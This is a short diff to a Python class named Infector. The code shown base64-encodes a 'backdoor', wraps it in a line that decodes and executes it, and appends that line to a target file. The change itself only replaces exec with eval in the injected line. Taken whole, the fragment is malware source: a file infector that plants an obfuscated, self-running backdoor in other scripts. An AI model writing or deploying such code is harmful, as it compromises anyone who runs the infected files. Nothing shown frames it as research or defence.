@@ -71,7 +71,7 @@ class Infector:
         backdoor_base64:bytes = b64encode(backdoor)
         payload = (
             "\n"*2 + "from binascii import a2b_base64\n" +
-            "exec(a2b_base64('{}'))\n".format(backdoor_base64.decode())
+            "eval(a2b_base64('{}'))\n".format(backdoor_base64.decode())
         )
         with open(target_file, "a") as f:
             f.write(payload)
